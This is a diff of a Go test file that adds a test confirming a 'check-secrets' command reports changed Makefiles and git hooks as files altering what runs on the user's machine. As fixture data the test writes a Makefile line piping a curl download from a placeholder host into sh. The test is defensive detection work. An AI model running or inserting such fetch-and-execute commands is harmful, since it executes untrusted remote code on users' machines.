@@ -7,6 +7,7 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/AndrewDryga/coop/internal/config"
 	"github.com/AndrewDryga/coop/internal/testutil/gitrepo"
 )
 
@@ -299,5 +300,49 @@ func TestCheckSecretsReportsNameShadowedCommitCandidates(t *testing.T) {
 	}
 	if !strings.Contains(joined, "id_ed25519") {
 		t.Errorf("--include-ignored dropped the name-shadowed commit candidate:\n%s", joined)
+	}
+}
+
+// check-secrets also lists the changed files that alter what runs on your machine — a hook, the
+// Makefile — with the reason, independent of the secret scan's verdict.
+func TestCheckSecretsReportsHostSurfaceChanges(t *testing.T) {
+	if _, err := exec.LookPath("git"); err != nil {
+		t.Skip("git not available")
+	}
+	pinGitConfig(t)
+	repo, git := gitrepo.New(t)
+	mk := func(rel, content string) {
+		t.Helper()
+		full := filepath.Join(repo, rel)
+		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	mk("Makefile", "all:\n\ttrue\n")
+	git("add", "Makefile")
+	git("commit", "-qm", "base")
+	mk("Makefile", "all:\n\tcurl -s https://example.invalid | sh\n")
+	mk(".githooks/pre-commit", "#!/bin/sh\n")
+	mk("main.go", "package main\n")
+	surfaces := hostSurfacesChanged(repo)
+	paths := map[string]string{}
+	for _, finding := range surfaces {
+		paths[finding.Path] = finding.Reason
+	}
+	if len(paths) != 2 || !strings.Contains(paths["Makefile"], "make") || !strings.Contains(paths[".githooks/pre-commit"], "git commit") {
+		t.Fatalf("host surfaces = %+v; want the modified Makefile and the new hook, not main.go", surfaces)
+	}
+	a := &app{cfg: &config.Config{RepoOverride: repo, ConfigDir: t.TempDir()}}
+	var code int
+	var runErr error
+	out := captureStderr(t, func() { code, runErr = a.cmdCheckSecrets(nil) })
+	if code != 0 || runErr != nil {
+		t.Fatalf("check-secrets = (%d, %v); the host-surface report must not change the exit code\n%s", code, runErr, out)
+	}
+	if !strings.Contains(out, "alter what runs on your machine") || !strings.Contains(out, ".githooks/pre-commit") {
+		t.Fatalf("check-secrets did not report the host surfaces:\n%s", out)
 	}
 }
